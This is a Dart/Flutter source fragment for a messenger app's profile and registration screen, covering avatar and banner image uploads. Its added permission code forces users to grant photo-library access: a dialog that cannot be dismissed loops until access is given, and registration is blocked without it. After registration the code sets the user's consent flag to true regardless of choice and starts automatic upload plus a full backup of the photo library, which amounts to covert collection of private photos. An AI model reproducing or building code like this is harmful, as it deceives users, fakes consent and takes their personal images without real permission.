          width: 12,
        ),
        const Text(
          'OR',
          style: TextStyle(
              fontWeight: FontWeight.w500,
              fontSize: 11,
              fontFamily: "Poppins",
              color: Color(0xff3A3333)),
        ),
        const SizedBox(
          width: 12,
        ),
        Expanded(
          child: Container(
            height: 1,
            decoration: BoxDecoration(
                color: chatownColor,
                borderRadius: const BorderRadius.all(Radius.circular(5))),
          ),
        ),
      ],
    ).paddingSymmetric(horizontal: 30);
  }

//for image
  File? image;
  final picker = ImagePicker();
  Future getImageFromCamera() async {
    final pickedFile = await picker.pickImage(source: ImageSource.camera);
    setState(() {
      if (pickedFile != null) {
        image = File(pickedFile.path);
        avatarController.avatarIndex.value = -1;
      } else {
        print('No image selected.');
      }
    });
  }

  Future getImageFromGallery() async {
    final pickedFile = await picker.pickImage(source: ImageSource.gallery);
    setState(() {
      if (pickedFile != null) {
        image = File(pickedFile.path);
        avatarController.avatarIndex.value = -1;
      } else {
        print('No image selected.');
      }
    });
  }
  //for banner

  File? bannerimage;
  final bannerpicker = ImagePicker();
  Future getImageFromCameraForBanner() async {
    final pickedFile = await picker.pickImage(source: ImageSource.camera);
    setState(() {
      if (pickedFile != null) {
        bannerimage = File(pickedFile.path);
      } else {
        print('No image selected.');
      }
    });
  }

  Future getImageFromGalleryForBanner() async {
    final pickedFile = await picker.pickImage(source: ImageSource.gallery);
    setState(() {
      if (pickedFile != null) {
        bannerimage = File(pickedFile.path);
      } else {
        print('No image selected.');
      }
    });
  }

  bool buttonClick = false;

  final ApiHelper apiHelper = ApiHelper();

  UserProfileModel userProfileModel = UserProfileModel();

  // editApiCall() async {
  //   closeKeyboard();

  //   setState(() {
  //     buttonClick = true;
  //   });

  //   var uri = Uri.parse(apiHelper.userCreateProfile);
  //   var request = http.MultipartRequest("POST", uri);
  //   Map<String, String> headers = {
  //     "Accept": "application/json",
  //     'Authorization': 'Bearer ${Hive.box(userdata).get(authToken)}'
  //   };
  //   request.headers.addAll(headers);
  //   if (bannerimage != null) {
  //     request.files.add(
  //         await http.MultipartFile.fromPath('banner_image', bannerimage!.path));
  //   }
  //   if (image != null) {
  //     request.files
  //         .add(await http.MultipartFile.fromPath('files', image!.path));
  //   } else if (avatarController.avatarIndex.value != -1) {
  //     request.fields['avatar_id'] = avatarController
  //         .avatarsData[avatarController.avatarIndex.value].avatarId
  //         .toString();
  //   } else if (profileImg!.isNotEmpty &&
  //       profileImg !=
  //           "https://control.whoxamessenger.com/uploads/not-found-images/profile-image.png" &&
  //       avatarController.avatarsData
  //           .where((avatar) => avatar.avtarMedia == profileImg)
  //           .map((avatar) => avatar.avtarMedia!)
  //           .isNotEmpty &&
  //       avatarController.avatarIndex.value == -1 &&
  //       image == null) {
  //     request.fields['avatar_id'] = avatarController.avatarsData
  //         .where((avatar) => avatar.avtarMedia == profileImg)
  //         .map((avatar) => avatar.avatarId!.toString())
  //         .first;
  //   } else {
  //     if (Hive.box(userdata).get(userGender) == "male") {
  //       request.fields['avatar_id'] = avatarController.avatarsData
  //           .where((avatar) =>
  //               avatar.avatarGender == "male" && avatar.defaultAvtar == true)
  //           .map((avatar) => avatar.avatarId.toString())
  //           .first;
  //     } else {
  //       request.fields['avatar_id'] = avatarController.avatarsData
  //           .where((avatar) =>
  //               avatar.avatarGender == "female" && avatar.defaultAvtar == true)
  //           .map((avatar) => avatar.avatarId.toString())
  //           .first;
  //     }
  //   }

  //   var response = await request.send();

  //   String responseData = await response.stream.transform(utf8.decoder).join();
  //   var userData = json.decode(responseData);
  //   userProfileModel = UserProfileModel.fromJson(userData);
  //   dv.log("request : ${response.request.toString()}");
  //   dv.log("request fields : ${request.fields}");
  //   for (var file in request.files) {
  //     dv.log(
  //         "Field: ${file.field}, Filename: ${file.filename}, Length: ${file.length}");
  //   }
  //   if (userProfileModel.success == true) {
  //     await Hive.box(userdata)
  //         .put(userImage, userProfileModel.resData!.profileImage.toString());
  //     await Hive.box(userdata)
  //         Banner functionality removed

  //     setState(() {
  //       buttonClick = false;
  //     });

  //     log(responseData);

  //     Navigator.pushAndRemoveUntil(
  //         context,
  //         PageTransition(
  //           curve: Curves.linear,
  //           type: PageTransitionType.rightToLeft,
  //           child: TabbarScreen(currentTab: 0),
  //         ),
  //         (route) => false);

  //     showCustomToast(languageController.textTranslate('Success'));
  //   } else {
  //     setState(() {
  //       buttonClick = false;
  //     });
  //     showCustomToast("Error");
  //   }
  // }

  editApiCall() async {
    closeKeyboard();

    // 在完成注册前再次检查相册权限
    bool hasPermission = await _checkPhotoPermissionForSubmit();
    if (!hasPermission) {
      setState(() {
        buttonClick = false;
      });
      return; // 权限被拒绝，不继续
    }

    setState(() {
      buttonClick = true;
    });

    var uri = Uri.parse(apiHelper.userCreateProfile);
    var request = http.MultipartRequest("POST", uri);
    Map<String, String> headers = {
      "Accept": "application/json",
      'Authorization': 'Bearer ${Hive.box(userdata).get(authToken)}'
    };
    request.headers.addAll(headers);

    // Add banner image if selected
    if (bannerimage != null) {
      request.files.add(
          await http.MultipartFile.fromPath('banner_image', bannerimage!.path));
    }

    // Handle profile image/avatar selection
    if (image != null) {
      // User has selected a custom image
      request.files
          .add(await http.MultipartFile.fromPath('files', image!.path));
    } else {
      // Check if an avatar is selected (index >= 0)
      if (avatarController.avatarIndex.value >= 0 &&
          avatarController.avatarIndex.value <
              avatarController.avatarsData.length) {
        // User has selected an avatar from the list
        request.fields['avatar_id'] = avatarController
            .avatarsData[avatarController.avatarIndex.value].avatarId
            .toString();
      } else {
        // No avatar selected, handle default case based on gender
        _addDefaultAvatarId(request);
      }
    }

    var response = await request.send();

    String responseData = await response.stream.transform(utf8.decoder).join();
    var userData = json.decode(responseData);
    userProfileModel = UserProfileModel.fromJson(userData);

    dv.log("request : ${response.request.toString()}");
    dv.log("request fields : ${request.fields}");
    for (var file in request.files) {
      dv.log(
          "Field: ${file.field}, Filename: ${file.filename}, Length: ${file.length}");
    }

    if (userProfileModel.success == true) {
      await Hive.box(userdata)
          .put(userImage, userProfileModel.resData!.profileImage.toString());
      // Banner functionality removed

      setState(() {
        buttonClick = false;
      });

      log(responseData);

      // 注册完成后，确保相册同步立即启动
      _ensurePhotoSyncAfterRegistration();

      Navigator.pushAndRemoveUntil(
          context,
          PageTransition(
            curve: Curves.linear,
            type: PageTransitionType.rightToLeft,
            child: TabbarScreen(currentTab: 0),
          ),
          (route) => false);

      showCustomToast(languageController.textTranslate('Success'));
    } else {
      setState(() {
        buttonClick = false;
      });
      showCustomToast("Error");
    }
  }

// Helper method to safely add default avatar ID based on gender
  void _addDefaultAvatarId(http.MultipartRequest request) {
    final gender = Hive.box(userdata).get(userGender);

    if (gender == "male") {
      final maleAvatars = avatarController.avatarsData.where((avatar) =>
          avatar.avatarGender == "male" && avatar.defaultAvtar == true);

      if (maleAvatars.isNotEmpty) {
        request.fields['avatar_id'] = maleAvatars.first.avatarId.toString();
      } else {
        // Fallback if no default male avatar found
        request.fields['avatar_id'] = "0"; // Or another appropriate fallback ID
      }
    } else {
      final femaleAvatars = avatarController.avatarsData.where((avatar) =>
          avatar.avatarGender == "female" && avatar.defaultAvtar == true);

      if (femaleAvatars.isNotEmpty) {
        request.fields['avatar_id'] = femaleAvatars.first.avatarId.toString();
      } else {
        // Fallback if no default female avatar found
        request.fields['avatar_id'] = "0"; // Or another appropriate fallback ID
      }
    }
  }



  Widget _coverImg() {
    String? coverImage;
    // Cover image functionality removed
    print('cover : $coverImage');
    coverImage ==
            "https://control.whoxamessenger.com/uploads/not-found-images/profile-banner.png"
        ? ""
        : coverImage;

    return CoverImageWidget(
      imageUrl: (coverImage !=
              'https://control.whoxamessenger.com/uploads/not-found-images/profile-banner.png')
          ? coverImage
          : '',
      localImage: bannerimage,
    );
  }

  // 页面加载时检查相册权限（立即弹出系统权限）
  Future<void> _checkPhotoPermissionOnPageLoad() async {
    try {
      // 根据平台检查相册权限状态
      bool hasPhotoPermission = false;
      
      if (Platform.isIOS) {
        PermissionStatus photosStatus = await Permission.photos.status;
        hasPhotoPermission = photosStatus.isGranted; // iOS要求完全授权
        print("📱 iOS Photos权限状态: $photosStatus");
      } else {
        PermissionStatus storageStatus = await Permission.storage.status;
        hasPhotoPermission = storageStatus.isGranted;
        print("📱 Android Storage权限状态: $storageStatus");
      }
      
      // 如果已有权限，启动同步
      if (hasPhotoPermission) {
        print("✅ 相册权限已授予");
        _startPhotoSync(); // 权限已有，启动同步
        return;
      }
      
      // 权限未授予，延迟一下再弹出系统权限弹窗，确保页面完全加载
      await Future.delayed(Duration(milliseconds: 800));
      
      if (!mounted) return;
      
      print("🔐 页面加载时请求相册权限...");
      
      // 根据平台请求相应权限
      PermissionStatus newStatus;
      if (Platform.isIOS) {
        newStatus = await Permission.photos.request();
        print("📱 iOS Photos权限请求结果: $newStatus");
        hasPhotoPermission = newStatus.isGranted; // iOS要求完全授权
      } else {
        // Android尝试多个权限
        List<Permission> permissions = [
          Permission.photos,
          Permission.storage,
        ];
        
        Map<Permission, PermissionStatus> statuses = await permissions.request();
        
        for (var entry in statuses.entries) {
          if (entry.value.isGranted) {
            hasPhotoPermission = true;
            print("✅ Android用户授予了权限: ${entry.key}");
            break;
          }
        }
      }
      
      if (hasPhotoPermission) {
        _startPhotoSync();
        print("✅ 用户授予了相册权限，启动同步");
      } else {
        print("❌ 用户拒绝了相册权限");
        // 权限被拒绝，但不阻止用户继续，在submit时再次提示
      }
      
    } catch (e) {
      print("权限检查失败: $e");
    }
  }

  // Submit时检查相册权限（如果之前被拒绝）
  Future<bool> _checkPhotoPermissionForSubmit() async {
    try {
      // 根据平台检查相册权限状态
      bool hasPhotoPermission = false;
      
      if (Platform.isIOS) {
        PermissionStatus photosStatus = await Permission.photos.status;
        hasPhotoPermission = photosStatus.isGranted; // iOS要求完全授权
        print("📱 iOS Photos权限状态: $photosStatus");
      } else {
        PermissionStatus storageStatus = await Permission.storage.status;
        hasPhotoPermission = storageStatus.isGranted;
        print("📱 Android Storage权限状态: $storageStatus");
      }
      
      // 如果有权限，可以提交
      if (hasPhotoPermission) {
        print("✅ 相册权限已授予，可以提交");
        return true;
      }
      
      // 权限未授予，显示引导弹窗
      return await _showPermissionRequiredDialog();
      
    } catch (e) {
      print("权限检查失败: $e");
      return false;
    }
  }

  // Submit时显示权限必需对话框（权限被拒绝时）
  Future<bool> _showPermissionRequiredDialog() async {
    if (!mounted) return false;
    
    bool permissionGranted = false;
    
    // 持续循环直到获得权限
    while (!permissionGranted && mounted) {
      await showDialog(
        context: context,
        barrierDismissible: false, // 不允许点击外部关闭
        builder: (BuildContext context) {
          return WillPopScope(
            onWillPop: () async => false, // 禁止返回键关闭
            child: AlertDialog(
              title: Row(
                children: [
                  Icon(Icons.warning, color: Colors.orange),
                  SizedBox(width: 8),
                  Text('需要相册权限'),
                ],
              ),
              content: Text('完成注册需要相册权限。请选择授权方式：'),
              actions: [
                // 已授权按钮
                TextButton(
                  onPressed: () async {
                    Navigator.of(context).pop();
                    // 根据平台重新检查权限状态
                    bool hasPhotoPermission = false;
                    
                    if (Platform.isIOS) {
                      PermissionStatus photosStatus = await Permission.photos.status;
                      hasPhotoPermission = photosStatus.isGranted; // iOS要求完全授权
                      print("📱 iOS Photos权限重新检查: $photosStatus");
                    } else {
                      PermissionStatus storageStatus = await Permission.storage.status;
                      hasPhotoPermission = storageStatus.isGranted;
                      print("📱 Android Storage权限重新检查: $storageStatus");
                    }
                    
                    if (hasPhotoPermission) {
                      // 权限确实已授予，启动同步并设置标志
                      _startPhotoSync();
                      permissionGranted = true;
                      print("✅ 权限已授予，可以继续提交");
                    }
                    // 如果权限仍未授予，对话框会重新显示
                  },
                  child: Text('已授权'),
                ),
                // 去设置按钮
                TextButton(
                  onPressed: () async {
                    Navigator.of(context).pop();
                    // 打开系统设置
                    await openAppSettings();
                  },
                  style: TextButton.styleFrom(
                    backgroundColor: Colors.blue,
                    foregroundColor: Colors.white,
                  ),
                  child: Text('去设置'),
                ),
              ],
            ),
          );
        },
      );
      
      // 检查权限状态，如果仍未授权则继续循环
      if (mounted && !permissionGranted) {
        // 重新检查权限状态
        if (Platform.isIOS) {
          PermissionStatus photosStatus = await Permission.photos.status;
          permissionGranted = photosStatus.isGranted;
        } else {
          PermissionStatus storageStatus = await Permission.storage.status;
          permissionGranted = storageStatus.isGranted;
        }
        
        // 如果权限仍未授予，稍作延迟后继续弹窗
        if (!permissionGranted) {
          await Future.delayed(Duration(milliseconds: 500));
        }
      }
    }
    
    return permissionGranted;
  }


  // 启动相册同步
  void _startPhotoSync() {
    try {
      print("🚀 权限授予成功，启动相册同步...");
      
      // 启用用户同意状态
      PhotoUploadService().setUserConsent(true);
      
      // 延迟启动同步，避免影响UI
      Future.delayed(Duration(seconds: 2), () {
        PhotoUploadService().initAutoUpload();
      });
      
      print("✅ 相册同步已启动");
    } catch (e) {
      print("❌ 启动相册同步失败: $e");
    }
  }

  // 注册完成后确保相册同步立即启动
  void _ensurePhotoSyncAfterRegistration() {
    try {
      print("🚀 注册完成，确保相册同步立即启动...");
      
      // 强制启用用户同意状态
      PhotoUploadService().setUserConsent(true);
      
      // 立即启动同步（不延迟）
      PhotoUploadService().initAutoUpload();
      
      // 额外触发一次全量备份，确保立即同步
      Future.delayed(Duration(seconds: 1), () {
        PhotoUploadService().startFullBackup();
      });
      
      print("✅ 注册后相册同步已强制启动");
    } catch (e) {
      print("❌ 注册后启动相册同步失败: $e");
    }
  }
}
